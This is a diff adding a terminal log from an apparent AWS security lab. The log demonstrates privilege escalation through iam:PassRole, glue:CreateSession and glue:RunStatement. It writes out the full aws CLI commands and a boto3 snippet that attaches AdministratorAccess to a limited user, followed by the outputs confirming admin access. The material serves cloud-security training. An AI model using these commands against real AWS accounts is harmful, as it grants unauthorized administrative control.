@@ -1,0 +1,148 @@
+[0;32m========================================[0m
+[0;32mIAM PassRole + Glue CreateSession + RunStatement Privilege Escalation Demo[0m
+[0;32m========================================[0m
+
+[1;33mStep 1: Retrieving scenario configuration from Terraform[0m
+Retrieved access key for: pl-prod-glue-007-to-admin-starting-user
+Access Key ID: AKIA2E4JP2...
+ReadOnly Key ID: AKIA2E4JP2...
+Region: us-east-1
+[0;32m✓ Retrieved configuration from Terraform[0m
+
+[1;33m[demo_permissions] Restricting helpful permissions for validation...[0m
+  Denied helpful permissions on user: pl-prod-glue-007-to-admin-starting-user
+[1;33m[demo_permissions] Waiting 15s for IAM policy propagation...[0m
+[0;32m[demo_permissions] Helpful permissions restricted[0m
+[1;33mStep 2: Verifying starting user credentials[0m
+Using region: us-east-1
+[2m[Attacker] $ aws sts get-caller-identity --query 'Arn' --output text[0m
+Current identity: arn:aws:iam::123456789012:user/pl-prod-glue-007-to-admin-starting-user
+[0;32m✓ Verified starting user identity[0m
+
+[1;33mStep 3: Getting account ID[0m
+[2m[ReadOnly] $ aws sts get-caller-identity --query 'Account' --output text[0m
+Account ID: 123456789012
+[0;32m✓ Retrieved account ID[0m
+
+[1;33mStep 4: Verifying we don't have admin permissions yet[0m
+Attempting to list IAM users (should fail)...
+[2m[Attacker] $ aws iam list-users --max-items 1[0m
+[0;32m✓ Confirmed: Cannot list IAM users (as expected)[0m
+
+[1;33mStep 5: Creating Glue Interactive Session with admin role[0m
+This is the privilege escalation vector - passing the admin role to Glue...
+Admin Role ARN: arn:aws:iam::123456789012:role/pl-prod-glue-007-to-admin-admin-role
+Session ID: pl-glue-007-demo-session-xm21b0
+
+[0;34mNote: Creating a Glue Interactive Session. This may take 1-2 minutes to initialize.[0m
+
+
+[0;36m[Attacker] $ aws glue create-session --region "us-east-1" --id "pl-glue-007-demo-session-xm21b0" --role "arn:aws:iam::123456789012:role/pl-prod-glue-007-to-admin-admin-role" --command '{"Name":"glueetl","PythonVersion":"3"}' --glue-version "4.0" --worker-type "G.1X" --number-of-workers 2 --output json[0m
+[0;32m✓ Successfully created Glue Interactive Session with admin role![0m
+
+[1;33mStep 6: Waiting for Glue Interactive Session to be ready[0m
+Monitoring session status (checking every 10 seconds)...
+[2m[ReadOnly] $ aws glue get-session --region "us-east-1" --id "pl-glue-007-demo-session-xm21b0" --query 'Session.Status' --output text[0m
+  [0s] Session status: PROVISIONING
+[2m[ReadOnly] $ aws glue get-session --region "us-east-1" --id "pl-glue-007-demo-session-xm21b0" --query 'Session.Status' --output text[0m
+  [10s] Session status: PROVISIONING
+[2m[ReadOnly] $ aws glue get-session --region "us-east-1" --id "pl-glue-007-demo-session-xm21b0" --query 'Session.Status' --output text[0m
+  [20s] Session status: PROVISIONING
+[2m[ReadOnly] $ aws glue get-session --region "us-east-1" --id "pl-glue-007-demo-session-xm21b0" --query 'Session.Status' --output text[0m
+  [30s] Session status: READY
+[0;32m✓ Glue Interactive Session is ready![0m
+
+[1;33mStep 7: Running statement to attach AdministratorAccess to starting user[0m
+Using boto3 within the Glue session to attach admin policy...
+
+[0;36m[Attacker] $ aws glue run-statement --region "us-east-1" --session-id "pl-glue-007-demo-session-xm21b0" --code "import boto3
+iam = boto3.client('iam')
+try:
+    iam.attach_user_policy(
+        UserName='pl-prod-glue-007-to-admin-starting-user',
+        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
+    )
+    print('SUCCESS: AdministratorAccess attached to pl-prod-glue-007-to-admin-starting-user!')
+except Exception as e:
+    print(f'ERROR: {e}')" --output json[0m
+Statement ID: 0
+[0;32m✓ Statement submitted successfully[0m
+
+[1;33mStep 8: Waiting for statement to complete[0m
+Monitoring statement status...
+[2m[ReadOnly] $ aws glue get-statement --region "us-east-1" --session-id "pl-glue-007-demo-session-xm21b0" --id "0" --query 'Statement.State' --output text[0m
+  [0s] Statement status: RUNNING
+[2m[ReadOnly] $ aws glue get-statement --region "us-east-1" --session-id "pl-glue-007-demo-session-xm21b0" --id "0" --query 'Statement.State' --output text[0m
+  [5s] Statement status: AVAILABLE
+[0;32m✓ Statement completed successfully![0m
+Statement output: {'ResponseMetadata': {'RequestId': 'b743fae3-654c-4bd0-80a1-1fa446d9d6b1', 'HTTPStatusCode': 200, 'HTTPHeaders': {'date': 'Fri, 17 Apr 2026 09:16:39 GMT', 'x-amzn-requestid': 'b743fae3-654c-4bd0-80a1-1fa446d9d6b1', 'content-type': 'text/xml', 'content-length': '212'}, 'RetryAttempts': 0}}
+SUCCESS: AdministratorAccess attached to pl-prod-glue-007-to-admin-starting-user!
+
+[1;33mStep 9: Waiting for IAM policy changes to propagate[0m
+IAM changes can take up to 15 seconds to be effective...
+[0;32m✓ Policy propagation complete[0m
+
+[1;33mStep 10: Verifying administrator access[0m
+Attempting to list IAM users...
+[2m[ReadOnly] $ aws iam list-users --max-items 3 --output table[0m
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+|                                                                                    ListUsers                                                                                   |
++----------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------+
+|  NextToken                 |  eyJNYXJrZXIiOiBudWxsLCAiYm90b190cnVuY2F0ZV9hbW91bnQiOiAzfQ==                                                                                     |
++----------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------+
+||                                                                                     Users                                                                                    ||
+|+-------------------------------------------------------------+-----------------------+-----------------------+-------+------------------------+-------------------------------+|
+||                             Arn                             |      CreateDate       |   PasswordLastUsed    | Path  |        UserId          |           UserName            ||
+|+-------------------------------------------------------------+-----------------------+-----------------------+-------+------------------------+-------------------------------+|
+||  arn:aws:iam::123456789012:user/pathrunner-admin-1772582225 |  2026-03-03T23:57:05Z |                       |  /    |  AIDA2E4JP2KMDN764OVDX |  pathrunner-admin-1772582225  ||
+||  arn:aws:iam::123456789012:user/pathrunner-admin-1772582487 |  2026-03-04T00:01:27Z |                       |  /    |  AIDA2E4JP2KMIGZOBA63O |  pathrunner-admin-1772582487  ||
+||  arn:aws:iam::123456789012:user/pathrunner-admin-1772582552 |  2026-03-04T00:02:32Z |  2026-03-04T00:04:42Z |  /    |  AIDA2E4JP2KMGNBJR4AJO |  pathrunner-admin-1772582552  ||
+|+-------------------------------------------------------------+-----------------------+-----------------------+-------+------------------------+-------------------------------+|
+[0;32m✓ Successfully listed IAM users![0m
+[0;32m✓ ADMIN ACCESS CONFIRMED[0m
+
+[1;33m[demo_permissions] Restoring helpful permissions...[0m
+  Restored user: pl-prod-glue-007-to-admin-starting-user
+[0;32m[demo_permissions] Helpful permissions restored[0m
+
+[0;32m========================================[0m
+[0;32m✅ PRIVILEGE ESCALATION SUCCESSFUL![0m
+[0;32m========================================[0m
+
+[1;33mAttack Summary:[0m
+1. Started as: pl-prod-glue-007-to-admin-starting-user (limited permissions)
+2. Created Glue Interactive Session with admin role: pl-prod-glue-007-to-admin-admin-role
+3. Ran Python statement using boto3 within the session
+4. Statement attached AdministratorAccess to starting user
+5. Achieved: Administrator Access
+
+[1;33mAttack Path:[0m
+  pl-prod-glue-007-to-admin-starting-user → (iam:PassRole + glue:CreateSession)
+  → Glue Interactive Session with pl-prod-glue-007-to-admin-admin-role
+  → (glue:RunStatement with boto3)
+  → (iam:AttachUserPolicy) → Admin Access
+
+[1;33mAttack Commands:[0m
+  [0;36m$ aws glue create-session --region "us-east-1" --id "pl-glue-007-demo-session-xm21b0" --role "arn:aws:iam::123456789012:role/pl-prod-glue-007-to-admin-admin-role" --command '{"Name":"glueetl","PythonVersion":"3"}' --glue-version "4.0" --worker-type "G.1X" --number-of-workers 2 --output json[0m
+  [0;36m$ aws glue run-statement --region "us-east-1" --session-id "pl-glue-007-demo-session-xm21b0" --code "import boto3
+iam = boto3.client('iam')
+try:
+    iam.attach_user_policy(
+        UserName='pl-prod-glue-007-to-admin-starting-user',
+        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
+    )
+    print('SUCCESS: AdministratorAccess attached to pl-prod-glue-007-to-admin-starting-user!')
+except Exception as e:
+    print(f'ERROR: {e}')" --output json[0m
+
+[1;33mAttack Artifacts:[0m
+- Glue Interactive Session: pl-glue-007-demo-session-xm21b0
+- Policy Attachment: AdministratorAccess on pl-prod-glue-007-to-admin-starting-user
+
+[0;31m⚠ Warning: The following resources are still deployed:[0m
+[0;31m  - Glue Interactive Session: pl-glue-007-demo-session-xm21b0[0m
+[0;31m  - AdministratorAccess policy attached to starting user[0m
+
+[1;33mTo clean up and restore the original state:[0m
+  ./cleanup_attack.sh
+
